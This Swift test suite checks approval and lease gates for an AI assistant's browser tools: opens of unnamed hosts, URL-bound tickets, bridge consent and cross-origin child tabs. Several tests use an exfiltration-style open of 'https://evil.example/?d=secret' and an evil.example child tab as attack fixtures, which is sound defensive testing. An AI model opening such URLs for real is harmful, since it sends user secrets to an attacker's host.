import CompanionCore
@testable import CompanionServices
import CompanionCoreTestSupport
import CompanionTestKit
import Foundation
import Testing

// Wave 18b security review: open goes through the navigate gate (H1), a child
// tab is adopted only from its opener's own origin (H2), the bridge does not
// carry leases from one session to the next (M1), an expired own lease does not
// skip the take sheet (M2), and a tab that is gone is not still owned (L2).

private struct Rig {
    let chat: BrowserToolRunner
    let bridge: BrowserToolRunner
    let channel: FakeBrowserChannel
    let clock: LeaseClock
    let leases: BrowserLeases

    func frames(_ match: (BrowserCommand) -> Bool) -> Int { channel.sent.map(\.command).filter(match).count }
    var opens: Int { frames { if case .open = $0 { return true }; return false } }
    var takes: Int { frames { if case .take = $0 { return true }; return false } }
}

private func rig(tabs: [BrowserTab]? = nil, pages: [BrowserPage] = [crmPage()]) -> Rig {
    let presence = BrowserPresence()
    presence.set(.comet)
    let clock = LeaseClock()
    let channel = FakeBrowserChannel(
        pages: pages, tabs: tabs ?? [BrowserTab(id: 12, title: "Gmail", url: crm + "/a", active: false)])
    let leases = BrowserLeases(epoch: presence.epoch, now: { clock.now })
    return Rig(
        chat: BrowserToolRunner(channel: channel, presence: presence, leases: leases, caller: "chat"),
        bridge: BrowserToolRunner(channel: channel, presence: presence, leases: leases, caller: "bridge"),
        channel: channel, clock: clock, leases: leases)
}

private let tab12 = #"{"tab":12}"#

private func call(_ name: String, _ arguments: String) -> ToolCallRef {
    ToolCallRef(id: "c", name: name, arguments: arguments)
}

private func open(_ url: String) -> String { #"{"url":"\#(url)"}"# }

// MARK: - H1

@Test func openOfAHostTheUserNamedActsWithNoSheet() async {
    let r = rig()
    let args = open("https://sf.example/")
    expect(r.chat.approval(for: call("browser_open", args), said: "abre sf.example") == nil, "nombrado: sin hoja")
    let out = await r.chat.execute(name: "browser_open", argumentsJSON: args)
    expect(out.ok, "abre")
    expectEq(r.opens, 1, "un frame open")
}

@Test func openOfAHostTheUserDidNotNameAsksAndCarriesNoData() async {
    let r = rig()
    let args = open("https://evil.example/?d=secret")
    guard let asked = r.chat.approval(for: call("browser_open", args), said: "abre sf.example") else {
        Issue.record("un host que no dijo debe pedir hoja"); return
    }
    expectEq(asked.toolName, "browser_open", "es la hoja del open")
    expect(asked.summary.contains("evil.example"), "nombra el host: \(asked.summary)")
    expect(!asked.summary.contains("secret"), "sin la query en la hoja")
    r.chat.granted(asked)
    let out = await r.chat.execute(name: "browser_open", argumentsJSON: args)
    expect(out.ok && r.opens == 1, "con un si, abre")
}

@Test func aDeniedOpenSendsNoOpenFrame() async {
    let r = rig()
    let args = open("https://evil.example/?d=secret")
    _ = r.chat.approval(for: call("browser_open", args), said: "")
    let out = await r.chat.execute(name: "browser_open", argumentsJSON: args)
    expect(!out.ok && out.output.contains("approval_required"), "sin ticket no corre")
    expectEq(r.opens, 0, "cero frames open")
}

@Test func anOpenTicketIsBoundToTheExactURL() async {
    let r = rig()
    guard let asked = r.chat.approval(for: call("browser_open", open("https://a.example/")), said: "") else {
        Issue.record("debia pedir hoja"); return
    }
    r.chat.granted(asked)
    let out = await r.chat.execute(name: "browser_open", argumentsJSON: open("https://evil.example/"))
    expect(!out.ok, "el si de una URL no abre otra")
    expectEq(r.opens, 0, "cero frames")
}

@Test func theBridgeAlwaysAsksBeforeOpeningEvenWhatTheUserSaid() async {
    let r = rig()
    let args = open("https://sf.example/")
    expect(r.bridge.approval(for: call("browser_open", args), said: "abre sf.example") != nil,
           "el puente no hereda lo que el usuario dijo al chat")
    let out = await r.bridge.execute(name: "browser_open", argumentsJSON: args)
    expect(!out.ok && r.opens == 0, "sin si, no abre")
}

// MARK: - H2

private func spawn(url: String, clock: LeaseClock) -> [BrowserTab] {
    [BrowserTab(id: 12, title: "CRM", url: crm + "/a", active: false, controlled: true),
     BrowserTab(id: 20, title: "", url: url, active: false, controlled: false, opener: 12,
                createdAt: clock.now.addingTimeInterval(1))]
}

private func child(origin: String) -> BrowserPage {
    BrowserPage(tab: 20, origin: origin, url: origin + "/x", title: "C", text: "hija", generation: 1,
                elements: [], truncated: false)
}

@Test func aSameOriginChildIsAdopted() async {
    let r = rig(pages: [crmPage(), child(origin: crm)])
    _ = await r.chat.execute(name: "browser_take", argumentsJSON: tab12)
    r.channel.setTabs(spawn(url: crm + "/new", clock: r.clock))
    r.clock.advance(2)
    let out = await r.chat.execute(name: "browser_read", argumentsJSON: #"{"tab":20}"#)
    expect(out.ok, "misma origen: hereda")
    expectEq(r.leases.owner(of: 20), "chat", "del dueno del opener")
}

@Test func aCrossOriginChildIsNotAdoptedAndNothingIsTaken() async {
    let evil = "https://evil.example"
    let r = rig(pages: [crmPage(), child(origin: evil)])
    _ = await r.chat.execute(name: "browser_take", argumentsJSON: tab12)
    r.channel.setTabs(spawn(url: evil + "/x", clock: r.clock))
    r.clock.advance(2)
    let out = await r.chat.execute(name: "browser_read", argumentsJSON: #"{"tab":20}"#)
    expect(!out.ok && out.output.hasPrefix(BridgeCode.notControlled), "otro origen: no controlada")
    expectEq(r.takes, 1, "solo el take de la 12, ninguno para la hija")
    expectEq(r.leases.owner(of: 20), nil, "sin dueno")
}

// MARK: - M1

private struct NoTools: ParentToolExecuting {
    func specs(_ language: AppLanguage) -> [ToolSpec] { [] }
    func handles(_ name: String) -> Bool { false }
    func execute(name: String, argumentsJSON: String) async -> ParentToolOutcome {
        ParentToolOutcome(ok: true, output: "", tool: name)
    }
}

@Test func aBridgeSessionChangeGivesBackWhatTheBridgeTookAndTakingAgainAsks() async throws {
    let root = FileManager.default.temporaryDirectory
        .appendingPathComponent("s18b-\(UUID().uuidString.prefix(8))", isDirectory: true)
    let channel = FakeBrowserChannel(
        pages: [crmPage()], tabs: [BrowserTab(id: 12, title: "CRM", url: crm + "/a", active: false)])
    let host = BrowserHost(
        directory: root.appendingPathComponent("b", isDirectory: true),
        installer: NativeHostInstaller(home: root, executable: root),
        language: { .en }, commanding: channel)
    host.presence.set(.chrome)
    let bridge = host.bridgeTools(parent: NoTools())
    guard let sheet = bridge.approval(for: call("browser_take", tab12), said: "") else {
        Issue.record("el puente pide hoja"); return
    }
    bridge.granted(sheet)
    let taken = await bridge.execute(name: "browser_take", argumentsJSON: tab12)
    expect(taken.ok, "toma")

    await host.bridgeSessionChanged().value

    let released = channel.sent.map(\.command).filter { if case .release = $0 { return true }; return false }
    expectEq(released.count, 1, "la extension recibe el release")
    let read = await bridge.execute(name: "browser_read", argumentsJSON: tab12)
    expect(read.output.hasPrefix(BridgeCode.notControlled), "el cliente nuevo no hereda la pestana")
    expect(bridge.approval(for: call("browser_take", tab12), said: "") != nil, "tomarla otra vez pide hoja")
}

// MARK: - M2

@Test func anExpiredOwnLeaseDoesNotSkipTheTakeSheet() async {
    let r = rig()
    guard let sheet = r.bridge.approval(for: call("browser_take", tab12), said: "") else {
        Issue.record("pide hoja"); return
    }
    r.bridge.granted(sheet)
    _ = await r.bridge.execute(name: "browser_take", argumentsJSON: tab12)
    r.clock.advance(BrowserLease.idleRelease + 1)
    expect(r.bridge.approval(for: call("browser_take", tab12), said: "") != nil, "expirada: la hoja vuelve")
    let out = await r.bridge.execute(name: "browser_take", argumentsJSON: tab12)
    expect(!out.ok && out.output.contains("approval_required"), "y sin si no corre")
    expectEq(r.takes, 1, "un solo take")
}

// MARK: - L2

@Test func aTabGoneFromTheListingIsNoLongerOwned() async {
    let r = rig()
    _ = await r.chat.execute(name: "browser_take", argumentsJSON: tab12)
    expectEq(r.leases.owner(of: 12), "chat", "suya")
    r.channel.setTabs([])
    _ = await r.chat.execute(name: "browser_tabs", argumentsJSON: "{}")
    expectEq(r.leases.owner(of: 12), nil, "la pestana ya no existe: suelta")
}

@Test func aStaleTabAnswerClearsTheLease() async {
    let r = rig()
    _ = await r.chat.execute(name: "browser_take", argumentsJSON: tab12)
    r.channel.goneOnRead(12)
    let out = await r.chat.execute(name: "browser_read", argumentsJSON: tab12)
    expect(!out.ok && out.output.contains(BridgeCode.staleId), "stale_id")
    expectEq(r.leases.owner(of: 12), nil, "y ya no es suya")
}

// MARK: - M1 wiring

private final class Count: @unchecked Sendable {
    private let lock = NSLock()
    private var value = 0
    var current: Int { lock.withLock { value } }
    func bump() { lock.withLock { value += 1 } }
}

@Test @MainActor func aBridgeSessionSignalsItsBoundariesWhenItStartsAndEnds() async {
    let count = Count()
    let session = BridgeSession(
        tools: FakeParentTools(), guard: ParentToolGuard(approvals: ScriptedApprovals(answer: true)),
        token: { "tok" }, language: { .en }, accessibility: { true },
        onSessionBoundary: { count.bump() })
    let pair = BridgePair()
    let serving = await openSession(session, pair)
    expectEq(count.current, 1, "al empezar")
    pair.closeClient()
    await serving.value
    expectEq(count.current, 2, "al terminar")
}
